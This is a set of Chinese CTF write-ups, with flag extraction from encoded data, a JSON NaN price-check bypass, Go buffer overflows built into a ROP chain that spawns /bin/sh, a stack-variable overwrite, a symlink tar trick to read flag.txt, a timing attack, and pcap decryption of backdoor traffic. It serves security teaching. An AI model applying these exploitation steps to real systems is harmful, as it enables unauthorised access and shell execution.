AAAFWHjabVRfbBRFGJ/ZOeifa+m2hVJaoNf2iohQtndX9ipS29IeVuwVe/1zbfc4
5/bm7pbu7V5255DjaDISozExaggxSIxC+2KRqBhjCPFBQwgmPggtSnySFx98IP57
ML4590dEw2w2+33fzHzz+37fbyeW0TWbStIdKCDHuvUvngi7jxPL1kwj7DZjx4hK
7Vk3ttSUxsOTbmpmGgB85cLHYntFZXtHp7trx2M7H9/1RI+/78DgoWeC4zNhJarG
U7pp0ym3kdX1tapqZ02TayYY6l4gOXuOf8t5p92qjm17pXZDnVjf0LhxExMYYg62
jq1nFaySVbHqlc3NW1pat27b3sacrIZtYHWsnrWwVraNbWeucAzbRNcMMqWaumlN
ps04maIa1Uk4YxGcjukkksZJQ0toKqa8pMk4piQq1sWwupC0zKwRP1jYOGebWUsl
k+QE7QTlsbZ7j7N7rzQVDE0cGlKCoeLCUAarZFzcJXX3+fd5fL19/j6/S+qWJLnH
I/XxIXsLrkf2eX0Sj/YCEbLaVY/X1ztXKtbAaRIumcSeKadd2if/Y4aDofEiO6Jj
1fnk/qdmOV02tTQjycQjPFH/0xx+MDSWpZhXFyrOLPcPyHxfyVkbch4cHgk88Dn0
QcqtWJYSmzWwLawxKq4qcVPNpolBi0jme6QMjeSxRTVVJ4vVStYmvNIFnCTz3Cxg
tiP5IseLri4eibsSpsVfg7qK0Yd35HHatnPpGF+ZxjRl/3+uEHzU3HyWJvyRvGZk
OFJDLR2UyOouarpoLkNccc3ivOg5bmDV0jhWl5rCFlYp12t1QWajh8cuPss2XnyO
bWLN08FQgAO8c+T5CWdocmqa+yHtJOHEJAI6TtrcD/LCOgd2lhouiqyJbZ4eMw2s
mpzp2blyhqV5uWzxaOQoJ3RYUwtqwlZuKSLz4As4KjY8xHO8RP1STH5kvHNgqHTk
KnEmkoUfg2ocyOCXfrLwp/oT28pTasf4mcNcrUsLctkqKDK9Vwr0uPgDWG2h05mR
AGsr9fRAXoklXIOh0dCiku+V0l4l6stkbCWa7R1RomNeGXPx+5RofNyQlehonyFN
ECVKU96x9nZlkR+ZPR4VGx9I698al7MRuSi6wyRH4oPlq+B27uSkZZqUQVAJ6kEL
6AR7gAfIYB5gkAIZkAenwevgDfAWOAPOgrfBOXAevAveAx+AS+Ay+Ah8Aj4Fn4HP
wVVwDXwBboBvwC3wPfgR3Ae/Qwesg82wDXZBD4xCDFWYgjY8BV+Gr8I34Tl4Hr4P
V+CH8DK8Aq/Dm/AWvAvvwfvwF/gb/EP4WvhWuC2sCd8Jd4UfhHvCz8Kvwl8IoCrk
RLWoDjWhVtSButBu1IP60SAKoHl0FNnoFHoJvYbOoLPoHXQBLaNL6Aq6iq6hr9B1
dAPddFQ4ahwdjh0Ov2O/Y6DUQQGWr4s8+M9wDP0NfUGwlA==
```

後來將所有的字串合起來解開後，出現的是一個 data Orz

接著用 binwalk 跑一下，發現裡面還有裝其他東西

```
% file tmp
tmp: data

% binwalk tmp

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
4             0x4             Zlib compressed data, best compression
```

解開後出現的是 Apple binary property list ，不過不重要，直接 strings 就可以在裡面找到 flag 了

```
% file 4
4: Apple binary property list

% strings 4 | grep ASIS
={\bf ASIS}\{50m3\_4pps\_u5E\_M37adat4\_dOn7\_I9n0Re\_th3M!!\}
```




### File: CTF/2018/ASIS_CTF_qual/web/Buy_flags/README.md

# Buy flags

> Challenge Link: [Buy flags](https://asisctf.com/challenges/)
>
> Category: misc
>
> Writeup: [Buy flags](https://github.com/frozenkp/CTF/tree/master/2018/ASIS_CTF_qual/web/Buy_flags)

[Here](http://46.101.173.61/) is an online shop that sells flags :) but we don’t have enough money! Can you buy the flag?

## Observation

這是一個可以購買 flag 的網站，可以勾選想要的 flag，然後輸入 coupon，不過 credit 是 0，也不知道 coupon 是啥，所以都只會回傳 "your credit not enough"

![](https://i.imgur.com/a349JzK.png)

### pay API

按下 pay 以後會 POST 到 http://46.101.173.61/pay

傳的內容有 coupon 以及點選的 flag 項目及數量

```json
{"card": [{"name": "asis", "count": 1}], "coupon": "YWJj"}
```

結果也是用 json 回傳

```json
{"result": "your credit not enough"}
```

這邊有嘗試把 count 改成 0 或是 -1，不過 server 都有處理掉

```json
{"card":[{"name":"asis","count":-1}],"coupon":"aA=="}
```

```json
{"result": "item count must be greater than zero"}
```

### image API

檢查原始碼以後發現圖片是由 http://46.101.173.61/image?name=asis.png 傳過來的，看起來應該是可以做 LFI，不過經過測試後發現只要輸入 `/` 或 `..` 就會回傳 `Access Denied`，猜測可能 server 的檔案也放在當前目錄，所以試了 `server.py` ，但也沒拿到

### flask session

Cookie 的部分有一個 session，乍看之下以為是 jwt，第一段可以解出 data，但其他兩段就完全不能解了

後來查了一下才知道是 flask session，後面兩段是用來驗證第一段的 data 的，需要有 secret key 才能偽造

```
eyJjb3Vwb25zIjpbXSwiY3JlZGl0IjowfQ.Dctipw.Q8aC2jTPn9lLxZQU-0Fc3oBx3Ig
```

```json
{"coupons":[],"credit":0}
```



## Solution

解法的部分是在賽後參照 Writeup 的

### Source code

首先是可以利用 image API 拿到 `app.py`  (flask 的預設 server file)

```
http://46.101.173.61/image?name=app.py
```

其中，flag 是放在 private/flag.txt，secret key 則是放在 private/secret.txt

```python
4   app.secret_key = open('private/secret.txt').read()
20  'data': open('private/flag.txt').read()
```

看一下 image API 的寫法，已經把 private 底下的檔案濾掉了

```python
if '/' in image_name or '..' in image_name or 'private' in image_name:
	return 'Access Denied'
```

### json NaN

最後的解法是在 pay API 把數量改成 NaN 就可以拿到 flag 了

原始碼中，count 的驗證如下

```python
data = request.get_json()
card = data['card']
for flag in card:
    if flag['count'] <= 0:
        return jsonify({'result':'item count must be greater than zero'})
```

實際測試一下，NaN 在 parse 後是 float，且可以通過 `<= 0` 的驗證

```python
>>> text = '{"var":NaN}'
>>> data = json.loads(text)
>>> print data
{u'var': nan}
>>> data['var']
nan
>>> type(data['var'])
<type 'float'>
>>> data['var'] <= 0
False
```

接下來在計算 credit 時的驗證方法如下

```python
for flag in card:
	credit -= flag['count'] * flags[flag['name']]['price']
if credit < 0:
	result = {'result': 'your credit not enough'}
```

實際測試後發現，只要操作流程中有用到 nan，該變數就會被設成 nan，也就可以順利通過驗證了

```python
>>> credit = 0
>>> credit -= data['var'] * 110
>>> credit
nan
>>> credit < 0
False
```




### File: CTF/2018/BambooFox_CTF_2018/infant-gogogo/README.md

# infant-gogogo

> Challenge Link: [infant-gogogo](http://ctf.bamboofox.cs.nctu.edu.tw/challenges#infant-gogogo)
>
> Category: pwn

Give me your magic text ~~~

`nc bamboofox.cs.nctu.edu.tw 58795`

[infant-gogogo.zip](http://ctf.bamboofox.cs.nctu.edu.tw/files/1f36921a750a6904cf3b6133cecf1554/infant-gogogo.zip)

## 觀察

這支程式可以讓使用者輸入一串字串，看起來跟前一題的 [infant-gotoheaven](https://github.com/frozenkp/CTF/tree/master/BambooFox_CTF_2018/infant-gotoheaven) 很像

```
% ./infant-gotoheaven                     
Give me your text : 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

### Buffer overflow

先試一下是否也有 Buffer overflow

```
% ./infant-gogogo              
Give me your text : 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
unexpected fault address 0x0
fatal error: fault
[signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x489834]

goroutine 1 [running]:
runtime.throw(0x4b9168, 0x5)
        /usr/local/go/src/runtime/panic.go:605 +0x95 fp=0xc420043f28 sp=0xc420043f08 pc=0x427345
runtime.sigpanic()
        /usr/local/go/src/runtime/signal_unix.go:374 +0x227 fp=0xc420043f78 sp=0xc420043f28 pc=0x43a307
main.main()
        /home/frozenkp/Downloads/gobin/infant-gogogo.go:20 +0x1b4 fp=0xc420043f80 sp=0xc420043f78 pc=0x489834
```

最後一行有寫到死在`infant-gogogo.go:20`

用`objdump`看一下發現是死在`ret`，所以應該跟上題一樣，也是可以**蓋到 return address**

![](https://i.imgur.com/J0SdY2P.png)

## 解法

這題跟  [infant-gotoheaven](https://github.com/frozenkp/CTF/tree/master/BambooFox_CTF_2018/infant-gotoheaven) 的主要差別在於 [infant-gotoheaven](https://github.com/frozenkp/CTF/tree/master/BambooFox_CTF_2018/infant-gotoheaven) 有提供可以直接拿到 shell 的 `system call` ，這題則要自己建 ROP chain

### payload

先隨便輸入來造成 segmenataion fault，確定程式會產生 buffer overflow，且是死在 return addresss 錯誤

![img](https://i.imgur.com/3w10UGw.png)

計算一下 payload 是 **256**

### ROP chain

因為 Go 的 binanry 檔是 static link 的，基本上可以從裡面拿到各式各樣的 gadget

```
% file infant-gogogo 
infant-gogogo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```

#### execve

根據 [這篇](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) 整理的表格，要執行 `execve("/bin/sh")` 的條件是

| rax  | System call | rdi                  | rsi                      | rdx                      |
| ---- | ----------- | -------------------- | ------------------------ | ------------------------ |
| 59   | sys_execve  | const char *filename | const char *const argv[] | const char *const envp[] |

執行 `/bin/sh` 的話，只需要把 `rdi` 指向寫有 `/bin/sh` 的**位址**，`rsi` 及 `rdx`  則設成 0 (NULL) 即可

#### ROP gadget

基本上在設值的時候，如果可以拿到 `pop {resister}; ret` 形式的 gadget 最好，因為可以直接把要丟入的值寫在 gadget 的下一位，例如：

```
ropchain = pop_rax, p64(59)
```

這樣在執行 `pop rax` 時，會將 stack 上的第一位 pop 到 rax 上，而此時的第一位就會是 `p64(59)`

除此之外，也要注意**最後面必須是 ret** ，否則沒辦法繼續執行後段的 ROP chain

尋找 ROP gadget 可以使用指令 `ROPgadget` 搭配 `grep`，例如說要找 `pop rax` 時：

```
% ROPgadget --binary infant-gogogo | grep 'pop rax.*ret'
0x000000000044dd12 : add eax, ebp ; pop rax ; ret
0x000000000044dd10 : and al, 0x10 ; add eax, ebp ; pop rax ; ret
0x0000000000466d3e : je 0x466d67 ; pop rax ; ret
0x000000000044dd0d : or dh, al ; and al, 0x10 ; add eax, ebp ; pop rax ; ret
0x0000000000402563 : pop rax ; add rsp, 0x60 ; ret
0x000000000040e31b : pop rax ; and byte ptr [rax - 1], cl ; ret
0x0000000000448b11 : pop rax ; mov qword ptr [rsp + 0x10], rax ; ret
0x000000000043cfb3 : pop rax ; or byte ptr [rax - 0x7d], cl ; ret
0x000000000040985c : pop rax ; or dh, dh ; ret
0x0000000000404656 : pop rax ; ret
0x0000000000414f4a : pop rax ; ret 0xff2
0x000000000040e318 : sbb byte ptr [rax - 0x75], cl ; pop rax ; and byte ptr [rax - 1], cl ; ret
```

其中可以看到 `0x0000000000404656 : pop rax ; ret` 是最符合的 gadget

#### /bin/sh

前面有說到，`rdi`是寫有 `/bin/sh` 的**位址**，所以需要找一塊空間來寫 `/bin/sh`

在 gdb 中使用 `vmmap` 來尋找可用空間

```
gdb-peda$ vmmap
Start              End                Perm      Name
0x00400000         0x0048a000         r-xp      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo
0x0048a000         0x0051c000         r--p      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo
0x0051c000         0x0052f000         rw-p      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo
0x0052f000         0x00550000         rw-p      [heap]
0x000000c000000000 0x000000c000001000 rw-p      mapped
0x000000c41fff8000 0x000000c420100000 rw-p      mapped
0x00007ffff7f5b000 0x00007ffff7ffb000 rw-p      mapped
0x00007ffff7ffb000 0x00007ffff7ffd000 r--p      [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 r-xp      [vdso]
0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
```

其中有段 `0x0051c000         0x0052f000         rw-p` 是可寫的，我選擇 `0x523000` 來寫，盡量不要選擇太前面或太後面的位置，怕跟其他東西衝到

可以寫入到 `rdi` 的有以下兩句

```
0x0000000000485abd : pop rdi ; cmp dword ptr [rcx], eax ; add byte ptr [rax + 0x39], cl ; ret
0x00000000004518ff : mov qword ptr [rdi], rax ; ret
```

其中，`pop rdi` 的 gadget 後面還有 `add byte ptr [rax + 0x39]`，所以必須確保 `rax+0x39 `是一段可以寫的位址，否則會死掉

因此我先將 `rax` 設成 data 的位址，設完 `rdi` 後，再將 `rax` 設成 `/bin/sh` ，最後填入 `ptr [rdi]` 中即可



所有得條件都設定完成後，執行即可拿到 shell 囉 OwO




### File: CTF/2018/BambooFox_CTF_2018/infant-gotoheaven/README.md

# infant-gotoheaven

> Challenge Link: [infant-gotoheaven](http://ctf.bamboofox.cs.nctu.edu.tw/challenges#infant-gotoheaven)
>
> Category: pwn

What's the token to heaven?

`nc bamboofox.cs.nctu.edu.tw 58796`

[infant-gotoheaven.zip](http://ctf.bamboofox.cs.nctu.edu.tw/files/974c6efa89c277c774f2dfd56500aaf0/infant-gotoheaven.zip)

## Go binanry 小訣竅

開始前先講一下分析 Go 的 binanry 時可以用到的一些工具以及訣竅

###  go tool objdump

`go tool`是 go 的編譯器內建的工具集，其中也有 `objdump`可以使用

使用這個工具的話可以看到 source code 中的**行數**對應到的 assembly

```bash
go tool objdump infant-gotoheaven | less
```

![](https://i.imgur.com/a7202rA.png)

### gdb

使用`gdb`追蹤時，在執行到`main`之前會經過一大堆的程序

在追蹤 C 的 binanry 時，通常會使用 `b main`來設斷點在`main` 的一開始

由上面 `go tool objdump`的圖可以看到，Go 的 `main` 叫做 `main.main` 所以要使用

```
b main.main
```

## 觀察

這支程式可以讓使用者輸入一串字串

```
% ./infant-gotoheaven                     
Give me your text : 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

### Buffer overflow

通常看到這類題目大概都是 buffer overflow ，所以先試一下能不能觸發 segmentation fault

```
% ./infant-gotoheaven
Give me your text : 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
unexpected fault address 0x0
fatal error: fault
[signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x4a263e]

goroutine 1 [running]:
runtime.throw(0x4d8780, 0x5)
        /usr/local/go/src/runtime/panic.go:605 +0x95 fp=0xc420043f28 sp=0xc420043f08 pc=0x427a05
runtime.sigpanic()
        /usr/local/go/src/runtime/signal_unix.go:374 +0x227 fp=0xc420043f78 sp=0xc420043f28 pc=0x43d037
main.main()
        /home/frozenkp/Downloads/gobin/infant-gotoheaven/infant-gotoheaven.go:27 +0x1ee fp=0xc420043f80 sp=0xc420043f78 pc=0x4a263e
```

最後一行有寫到死在`infant-gotoheaven.go:27`

用`objdump`看一下發現是死在`ret`，所以應該是可以**蓋到 return address**

![](https://i.imgur.com/5yNqs1q.png)

### weird

接著在翻一下`objdump`的結果，發現一個叫 `weird`的 function

![](https://i.imgur.com/zG0ODob.png)

其中有一行`CALL os/exec.Command(SB)`可以執行 system call

檢查一下其他地方的程式碼，發現`main.main`有呼叫到

![](https://i.imgur.com/dOiwh0q.png)

使用`gdb`強制讓`cmp`符合後跳過去後發現這個 system call 的參數是 `/bin/sh`

![](https://i.imgur.com/LSHqpjy.png)

所以只要進入到`weird`應該就能拿到 shell 了

## 解法

### payload

先隨便輸入來造成 segmenataion fault，確定程式會產生 buffer overflow，且是死在 return addresss 錯誤

![img](https://i.imgur.com/sMorU1A.png)

計算一下 payload 是 **224**

### weird

因為可以蓋到 return address，也就是說可以任意指定要跳到哪裡，那就把 return address 改成`weird`的開頭`0x4a2650`就可以跳過去執行囉

執行後果然就成功拿到 shell 了 OwO


### File: CTF/2018/BambooFox_CTF_2018/water-impossible/README.md

# water-impossible

> Challenge Link: [water-impossible](http://ctf.bamboofox.cs.nctu.edu.tw/challenges#water-impossible)
>
> Category: pwn

Welcome !! Challenger ~

Here is a simple challenge for you.

Try to find the key to pass.

`nc bamboofox.cs.nctu.edu.tw 58799`

[water-impossible.zip](http://ctf.bamboofox.cs.nctu.edu.tw/files/bb63dedd19b55a8fab5a08f28dea6269/water-impossible.zip)

## 須具備的知識

### Stack

stack 是程式在執行中用來儲存資料的結構，儲存的資料如

- 暫時的值
- return address
- 區域變數
- ...

### rsp

`rsp` 是用來儲存 stack 所在位置的暫存器

### 區域變數

宣告區域變數時，會將值存在 stack 上

假設宣告兩個變數 a, b

```c
int a = 1;
int b = 2;
```

宣告 a 時，stack 狀態如下

```
+----------+    0x7fffffffe728	low
|  a = 1   |
+----------+ 	0x7fffffffe730
|   ...    |
+----------+    0x7fffffffe738	high
```

宣告 b 時，stack 狀態如下

```
+----------+    0x7fffffffe720 	low
|  b = 2   |
+----------+	0x7fffffffe728
|  a = 1   |
+----------+	0x7fffffffe730
|   ...    |
+----------+    0x7fffffffe738	high
```

當 push 值進 stack 時，`rsp` 的位置會減足夠的大小，讓新的值可以填進來，所以後進來的 b 反而會存在較低位的地方

### Buffer overflow

在讀取輸入的時候，輸入的大小超過變數的大小，此時多的部份會超越區域變數的位址，進而蓋到 stack 上的其他位置

假設有一程式如下

```c
int key = 0xdeadbeef;
char buf[16] = {0};
gets(buf);
```

宣告後 stack 狀態如下

```
+----------------+  0x7fffffffe720    low  <-----+
|     0x0	 |				 |
+----------------+  0x7fffffffe728 		 |  buf[16]
|     0x0	 | 				 |
+----------------+  0x7fffffffe730         <-----+-----+
|   0xdeadbeef   |                                     | key
+----------------+  0x7fffffffe738    high <-----------+
```

因為 gets 沒有限制輸入的長度，因此可以輸入超過 buf 長度，此時多的部份就會蓋到 stack 其他部份

例如輸入 `aaaaaaaabbbbbbbbcccccccc`

```
+----------------+  0x7fffffffe720    low  <-----+
|   aaaaaaaa	 | 				 |
+----------------+  0x7fffffffe728               |  buf[16]
|   bbbbbbbb 	 |                               |
+----------------+  0x7fffffffe730         <-----+-----+
|   cccccccc   	 | 				       | key
+----------------+  0x7fffffffe738    high <-----------+
```

原本 `key` 存的位置就被 buf 的輸入蓋掉了

## 觀察

觀察一下code後可以發現觸發`system("/bin/sh")`的條件為`(int)token == 6666`

而token是一個宣告在`main`但從未被使用到的變數

```c
if((int)token == 6666){
  printf("wow, That's impossible to touch this token ?!");
  system("/bin/sh");
}
```

另外可以被exploit的部份為`read()`的 buffer overflow

```c
char key[16];
read(0, key, 40);
```

通常這類題目可能的作法有以下兩種

### 蓋 return

如果stack一直往下蓋的話可以碰到`return`，那就直接跳到`system("/bin/sh")`就好了

不過這題有限制長度40，所以沒辦法蓋到return

### 蓋 token

因為`token`也是宣告在stack上，應該可以找到`token`的位置後直接蓋成想要的值

## 解法

以下解法是用蓋token的方法

### 找 paylod 長度

先輸入以下字串來定位

```
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF
```

到`if((int)token == 6666)`時 stack 狀態如下

![](https://i.imgur.com/0wDePvP.png)

上圖可以看到`token`的位置以及內容是`[rbp-0x4] : 0x7fffffffdf1c ("DDDDEEEEEEEE0آ\367\377\177")`

由此可知到`token`之前，所需要的 payload 長度是 **28** ，也就是

```
AAAAAAAABBBBBBBBCCCCCCCCDDDD
```

### 蓋token的值

因為這支程式是在 **64位元** 的環境編譯的，所以送的時候要給64位元的位址，使用 pwntool 的話只要用`p64()`就可以囉

```python
r.sendline(payload + p64(0x1a0a))
```



### File: CTF/2020/AIS3_pre-exam/README.md

# AIS3 pre-exam 2020 Misc 官方 Writeup

## 💤 Piquero
### Description

I can’t see the flag. Where is it?

![](https://i.imgur.com/QOdvP4N.jpg)

### Solution
這題是編碼的題目，用的是 Braille，也就是生活中常見的盲人點字，這題會遇到的問題是 Braille 有多種語系，會需要推敲一下，不過 Flag 是英、數、符號組成，且網路上多數工具也是以英文為主，應該蠻容易試出來的(?)。

解法的部分，只要參考英文版 [wiki](https://en.wikipedia.org/wiki/Braille) 就可以逐字解開了，解答如下圖：

![](https://i.imgur.com/Uovcyfy.jpg)

### Note
這題的難度定位是最簡單的，想蠻久要出什麼題目的，後來看了網路上各種知識型頻道，剛好看到[啾啾鞋在講盲人點字](https://www.youtube.com/watch?v=1aop1ursHVE)，覺得挺有趣的，而且是同學日常生活中都見過，卻沒注意過的編碼，就出了這題。

在比賽過程中，很多同學都使用線上工具來解，得到類似下圖的結果，雖然說看到這個再通靈一下就知道 Flag 了(也確實有些同學是用通靈的)，不過在這個結果中可以發現，`AIS` 前面都有一個符號，且比賽有公告格式為 `AIS3{...}`，可推測該符號為大寫字母的前綴符號，而 `AIS3` 後方的兩個符號在前後都有，應為 `{}`，可得 `AIS3{I-feel-sleepy-Good-Night!!!}`，但這還是錯的，之後觀察一下一般 Flag 的寫法，應該就可以發現要將 `-` 改成 `_` 了。

![](https://i.imgur.com/PrXxm6T.png)

## 🐥 Karuego

### Description

Students who fail to summon will be dropped out.

![](https://i.imgur.com/pYqUF4f.jpg)

### Solution

先用 binwalk 掃一下可以發現圖片後面有一個加密過後的壓縮檔，接著用 lsb 掃一下原圖可以找到 `The key is : lafire` 的字串，使用 `lafire` 作為密碼解開壓縮檔即可得到下圖。

![](https://i.imgur.com/CAVz5ex.png)

### Note

這題是想出簡單的 stego 題，所以綜合了各種圖片常用的技巧來出題，上述解法只是其中一種，其實加密的壓縮檔可以直接使用 `rockyou.txt` 或是 John the Ripper 等工具暴力破解，另外壓縮檔的檔案結構沒有加密，可以在其中找到一張圖片 (`3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg`)，搜尋一下這張圖的原圖，再使用 `pkcrack` 做 known-plaintext attack 也可以解開。

## 👿 Shichirou

### Description

Don’t cheat!!!

```python
#!/usr/bin/env python3

import os
import sys
import tempfile
import subprocess
import resource

resource.setrlimit(resource.RLIMIT_FSIZE, (65536, 65536))
os.chdir(os.environ['HOME'])

size = int(sys.stdin.readline().rstrip('\r\n'))
if size > 65536:
    print('File is too large.')
    quit()

data = sys.stdin.read(size)
with tempfile.NamedTemporaryFile(mode='w+', suffix='.tar', delete=True, dir='.') as tarf:
    with tempfile.TemporaryDirectory(dir='.') as outdir:
        tarf.write(data)
        tarf.flush()
        try:
            subprocess.check_output(['/bin/tar', '-xf', tarf.name, '-C', outdir])
        except:
            print('Broken tar file.')
            raise

        try:
            a = subprocess.check_output(['/usr/bin/sha1sum', 'flag.txt'])
            b = subprocess.check_output(['/usr/bin/sha1sum', os.path.join(outdir, 'guess.txt')])
            a = a.split(b' ')[0]
            b = b.split(b' ')[0]
            assert len(a) == 40 and len(b) == 40
            if a != b:
                raise Exception('sha1')
        except:
            print('Different.')
            raise

        print(open('flag.txt', 'r').readline())
```

### Solution

這題是要上傳一個 tar 檔，裡面要有寫有 Flag 的 `guess.txt`，這邊可以使用 `ln` 來將 `guess.txt` 連結到 `flag.txt`，這樣開檔確認時就會開到相同的檔案。

```
ln -s ../flag.txt guess.txt
tar -cf Shichirou.tar guess.txt
```

### Note

這題其實是 AIS3 pre-exam 2016 misc 3，只有題目敘述、flag、以及家目錄的位置有更改，沒想到解出來的人好少QQ

## 👑 Saburo

### Description

Spell you flag and fight with me.
PS. flag is printable characters with `AIS3{…}`

### Solution

這題考的是 timing attack，隨著猜對的字越多，所需的時間就會越久，可以利用這個特性逐字檢驗，找出可能性最高的字。不過檢驗一個字元所需的時間是浮動的，雖說多檢驗一個字的確會花比較多時間，但浮動的範圍卻會越來越大，檢驗一個字元所需的時間為 11~15 ms，假設檢驗到第 10 個字元，得到的結果最快跟最慢可以差到 50 ms，這個問題會增加檢驗的難易度。

為了解決上述問題，必須使用一些技巧來避免誤判，首先是要確定哪個答案是錯的，當不斷往上增加時，得到的數字如果沒有繼續增加就代表前面可能有字元猜錯，這邊可以將前幾個字的差值平均，並與現在的差值做比較 (例如判斷現在的差值是否大於原差值的一半)，如果發現是錯的，就往前一個字元重找，除此之外，也可以將同個字串送多次來取得平均值，來求得比較穩定的答案。

### Note

這題原本的設計是使用 cpu time 來計算，但比賽開始後，因為很多人一起測，得到的時間其實不太穩定，因此比賽開始後幾小時我就將題目回傳的時間改成 `time += 11 + random()%5` 了，但賽中許多同學依然認為是系統不穩定造成的，並沒有發現這題真正的考點並加以改善，有點可惜QQ。

## 👻 Soy

### Description

Here is your flag.
Oops, my bad.

![](https://i.imgur.com/OdhitRq.png)

### Solution

這題可以參考英文版 [Wiki](https://en.wikipedia.org/wiki/QR_code)，在題目的 QRcode 中，被遮住的部分是容錯區塊，格式區塊以及資料區塊都是正常的，如果不管容錯的話，裡面存的資料是可以正確地解開的，而平常使用的解碼程式都會考慮容錯的部分，因此不會輸出儲存的資料。這題可以使用[線上工具](https://merricx.github.io/qrazybox/)或是跟著格式手解，解答請參考下圖：

![](https://i.imgur.com/65QlMr5.png)

### Note

這題是想考 QRcode 的格式的，只要看懂 QRcode 的設計就可以順利解出來，當時沒發現有線上工具可以用，也沒發現 HSCTF 2020 N-95 才剛出過類似的題目，結果就被瞬間解出來了QQ

## 🧸 Clara

### Description

I did nothing special today. >_<

### Solution

這題給了一包 100 mb 的 pcap，先分析一下傳輸的種類 (wireshark 在 statics -> conversations -> tcp)，可以發現有兩筆本機跟 `140.112.42.47` 的傳輸量特別大，且這兩筆是唯一未加密的 (可以用 `http` 過濾出來)。

![](https://i.imgur.com/diTAAkA.png)

follow 其中一筆，可以看到傳遞資料如下圖，比較一下這兩筆可以發現，開頭都是傳 `deadbeeffaceb00c`，後面才不一樣，前 8 bytes 實際上是在做 key exchange，而 key 的長度是 8 bytes，遠端會將 key XOR `deadbeeffaceb00c`，本地端收到後再解密得到 key，接著後面的傳輸都是經由該 key 做 XOR 後傳輸的。

![](https://i.imgur.com/9ILBv9a.png)

其實翻到後面可以發現有些區段是可以看到包含 `AIS3{NO}` 和 `xSECRETx` 的字串，這分別是兩次所使用的 key，因為傳遞的資料中包含 `0x00`，所以經過 XOR 後可以直接看到原本的 key，即便沒有發現前面是 key exchange，一樣可以從這邊推敲出加密方式以及 key。

![](https://i.imgur.com/L3qySut.png)

接著要解密所傳輸的資料，觀察一下格式可以發現後面的資料都是由 4 bytes + n bytes + 4 bytes + m bytes 組成，其中 n 都比較小，而 m 都非常大，這邊可以猜測 m 是資料本身，而 n 則是跟該資料有關的 metadata，前面的 4 bytes 則可能是長度。因為一般後門透過 socket 在傳輸時，必須先溝通好格式，C2 Server 才能順利解讀 backdoor 傳過來的訊息，尤其是在傳送檔案這種不固定大小的資料，一定要先講好長度或是前後綴。

經過解密後可以發現，4 bytes 為 Little Endian 表示的長度 (n / m)，後面 n / m bytes 則分別是檔名以及檔案內容，其中第二次對話的第四張圖片即為 Flag。

![](https://i.imgur.com/5wsqeMz.jpg)

### Note

我最近的研究項目是以單純利用 monitor 錄到的資訊，且盡量避免直接分析 binary 的方式來分析 malware，所以想試著把各種線索匯集在一起出成題目，我最後採用了 pcap 的方式，因為比較好分析，對新手也比較容易上手。因為只有 pcap，所以必須給足線索，我選擇透過 `http` 的方式傳遞數張大型圖片，如果有仔細分析過內容的話，應該是可以很快找到可疑的流量。

接著是加密的部分，直接看的話是看不出到底在傳什麼，因此可以知道是有加密過的，問題是用什麼方式以及什麼 key 加密，如果是直接使用設計時就寫好的 key 加密的話，我覺得這題就太通靈了，因此我用了比較簡單易懂的方式來做 key exchange，為了避免參賽者沒有發現，我故意將 backdoor 斷線並重新連線，且兩次使用不同的 key 來加密，透過觀察初始的 `deadbeeffaceb00c` 應該就可以推敲出來了 (其中一位解開的同學也確實是這麼做的)。另外 key 的長度設定為 8 bytes 也是一個線索，因為圖片會有許多 `0x00` 所以加密後可以直接看到 key 的內容，將 wireshark 切到 hex mode 以後，它是以每 16 bytes 做對齊的，仔細觀察就可以發現同一列會出現多個同樣字元，全部彙集起來後就是該次的 key 了。

